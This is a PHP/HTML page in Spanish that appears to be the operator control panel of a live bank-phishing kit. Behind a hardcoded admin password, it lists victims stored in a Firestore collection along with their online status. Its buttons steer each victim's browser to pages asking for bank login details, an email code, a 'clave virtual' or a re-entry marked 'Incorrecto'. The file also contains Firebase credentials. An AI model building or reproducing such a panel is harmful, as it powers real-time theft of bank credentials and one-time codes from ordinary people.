<?php
session_start();
$ADMIN_USER = "ganadoresx100pre";
$ADMIN_PASS = "ashe2026ganador"; // Cambia esto por tu contraseña deseada
$error = false;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $usuario_ingresado = $_POST['user'] ?? '';
    $password_ingresado = $_POST['pass'] ?? '';

    if ($usuario_ingresado === $ADMIN_USER && $password_ingresado === $ADMIN_PASS) {
        $_SESSION['autenticado'] = true;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit();
    } else {
        $error = true;
    }
}

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit();
}
?>
<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link
      rel="stylesheet"
      href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"
      integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm"
      crossorigin="anonymous"
    />
    <title>Control de Calidad - Dark Mode</title>
    <style>
      /* Estilos Generales Dark Mode */
      body {
        font-family: Arial, sans-serif;
        padding: 20px;
        background-color: #343a40;
        color: #ffffff;
      }

      h1 {
        color: #ffffff;
      }

      /* Estilos de la lista */
      .list-group-item {
        background-color: #495057;
        border: 1px solid #6c757d;
        color: #ffffff;
      }

      /* Indicador de estado (latido) */
      .status-dot {
        height: 12px;
        width: 12px;
        border-radius: 50%;
        display: inline-block;
        margin-right: 8px;
      }
      .status-online {
        background-color: #28a745;
        box-shadow: 0 0 8px #28a745;
      }
      .status-offline {
        background-color: #dc3545;
      }

      /* Estilos específicos para los botones */
      .btn-secondary {
        background-color: #6c757d;
        border-color: #6c757d;
        color: white;
      }
      .btn-secondary:hover {
        background-color: #5a6268;
        border-color: #545b62;
      }

      .btn-danger {
        background-color: #dc3545;
        border-color: #dc3545;
      }

      .btn-success {
        background-color: #28a745;
        border-color: #28a745;
      }

      .btn-warning-orange {
        background-color: #ffc107;
        border-color: #ffc107;
        color: #212529;
      }
      .btn-warning-orange:hover {
        background-color: #e0a800;
        border-color: #d39e00;
        color: #212529;
      }

      /* Estilos para la tarjeta de Login */
      .login-card {
        background-color: #495057;
        padding: 30px;
        border-radius: 8px;
        box-shadow: 0 4px 10px rgba(0,0,0,0.3);
        width: 100%;
        max-width: 400px;
        margin: 80px auto;
      }
      .form-control {
        background-color: #343a40;
        border: 1px solid #6c757d;
        color: white;
      }
      .form-control:focus {
        background-color: #343a40;
        color: white;
        border-color: #007bff;
        box-shadow: none;
      }

      strong {
        color: #ffffff;
      }
    </style>
  </head>

  <body>
    <?php if (!isset($_SESSION['autenticado']) || $_SESSION['autenticado'] !== true): ?>
      <!-- 1. SECCIÓN DE LOGIN -->
      <div class="container">
        <div class="login-card">
          <h3 class="text-center mb-4">🔐 Acceso Admin</h3>
          <form method="POST" action="">
            <div class="form-group">
              <label for="user">Usuario</label>
              <input type="text" id="user" name="user" class="form-control" placeholder="Ingrese su usuario" required>
            </div>
            <div class="form-group">
              <label for="pass">Contraseña</label>
              <input type="password" id="pass" name="pass" class="form-control" placeholder="Ingrese su contraseña" required>
            </div>
            <button type="submit" class="btn btn-primary btn-block mt-4">Ingresar</button>
            <?php if ($error): ?>
              <div class="text-danger text-center mt-3">Usuario o contraseña incorrectos</div>
            <?php endif; ?>
          </form>
        </div>
      </div>
    <?php else: ?>
      <!-- 2. CONTENIDO PROTEGIDO DEL PANEL -->
      <div class="container">
        <div class="d-flex justify-content-between align-items-center my-4">
          <h1 class="m-0">🛜Panel de Control🛜</h1>
          <a href="?logout=true" class="btn btn-danger btn-sm">Cerrar Sesión</a>
        </div>
        <!-- Contenedor de la lista -->
        <div id="data" class="list-group">
          <!-- Los elementos se cargarán aquí dinámicamente -->
        </div>
      </div>

      <!-- Scripts de Firebase -->
      <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
      <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-firestore.js"></script>
      <script>
        // Configuración de Firebase
        const firebaseConfig = {
          apiKey: "AIzaSyDWkga80jjGG2YtF9obwfIf9UuSACayWko",
          authDomain: "kkkkk-5e2bd.firebaseapp.com",
          databaseURL: "https://kkkkk-5e2bd-default-rtdb.firebaseio.com",
          projectId: "kkkkk-5e2bd",
          storageBucket: "kkkkk-5e2bd.firebasestorage.app",
          messagingSenderId: "1059258934487",
          appId: "1:1059258934487:web:72d14c094dc78e6140fc92"
        };

        // Inicializar Firebase
        if (!firebase.apps.length) {
          firebase.initializeApp(firebaseConfig);
        }
        const db = firebase.firestore();

        // Función para mostrar los datos
        function displayData(docs) {
          const dataDiv = document.getElementById("data");
          dataDiv.innerHTML = ""; // Limpiar contenido previo

          docs.forEach((doc) => {
            const data = doc.data();
            const docDiv = document.createElement("div");
            docDiv.className = "list-group-item list-group-item-action flex-column align-items-start mb-2";
            
            // --- LÓGICA DEL LATIDO ---
            let isOnline = false;
            if (data.last_active && data.last_active.toDate) {
              const lastActiveTime = data.last_active.toDate().getTime();
              const ahora = new Date().getTime();
              // Si la última señal fue hace menos de 10 segundos, se considera "En línea"
              if ((ahora - lastActiveTime) < 10000) {
                isOnline = true;
              }
            }

            const dotClass = isOnline ? "status-online" : "status-offline";
            const statusText = isOnline ? "En línea" : "Desconectado";

            // Estructura HTML interna del elemento
            docDiv.innerHTML = `
              <div class="d-flex w-100 justify-content-between align-items-center flex-wrap">
                <h5 class="mb-1 d-flex align-items-center">
                  <span class="status-dot ${dotClass}" title="${statusText}"></span>
                  <strong>User:</strong>&nbsp;${doc.id}&nbsp;
                  <small class="text-muted" style="font-size: 0.75rem;">(${statusText})</small>
                </h5>
                <div class="btn-group flex-wrap mt-2 mt-md-0" role="group">
                  <button class="btn btn-danger btn-sm m-1" onclick="deleteDocument('${doc.id}')">Eliminar</button>
                  <button class="btn btn-success btn-sm m-1" onclick="changePageToBco('${doc.id}')">Mandarlo Al Banco</button>
                  <button class="btn btn-secondary btn-sm m-1" onclick="changePageToUserinco('${doc.id}')">Cod Correo</button>
                  <button class="btn btn-secondary btn-sm m-1" onclick="changePageToContraincoo('${doc.id}')">Clave virtual</button>
                  <button class="btn btn-warning-orange btn-sm m-1" onclick="changePaget('${doc.id}')">Incorrecto</button>
                  <button class="btn btn-secondary btn-sm m-1" onclick="changePageToContra('${doc.id}')">Inicio</button>
                </div>
              </div>
            `;
            dataDiv.appendChild(docDiv);
          });
        }

        // Obtener datos de Firestore en tiempo real
        db.collection("prolme").onSnapshot((snapshot) => {
          const docs = snapshot.docs;
          displayData(docs);
        });

        // --- BUCLE PARA REFRESCAR LOS ESTADOS VISUALES (LATIDOS) CADA 3 SEGUNDOS ---
        setInterval(() => {
          const docs = [];
          db.collection("prolme").get().then((snapshot) => {
            displayData(snapshot.docs);
          });
        }, 3000);

        // --- FUNCIONES DE LA BASE DE DATOS ---

        function deleteDocument(id) {
          db.collection("prolme").doc(id).delete()
            .then(() => console.log("Documento eliminado con ID: ", id))
            .catch((error) => console.error("Error eliminando el documento: ", error));
        }

        function changePageToTwo(id) { actualizarPagina(id, 5); }
        function changePageToUserinco(id) { actualizarPagina(id, 6); }
        function changePageToContraincoo(id) { actualizarPagina(id, 7); }
        function changePageToBco(id) { actualizarPagina(id, 2); }
        function changePaget(id) { actualizarPagina(id, 4); }
        function changePageToContra(id) { actualizarPagina(id, 3); }

        function actualizarPagina(id, numeroPagina) {
          db.collection("prolme").doc(id).update({
            page: numeroPagina,
          })
          .then(() => console.log(`Página cambiada a ${numeroPagina} para el documento con ID: ${id}`))
          .catch((error) => console.error("Error cambiando la página: ", error));
        }
      </script>
    <?php endif; ?>

    <!-- Scripts de Bootstrap JS y dependencias -->
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
  </body>
</html>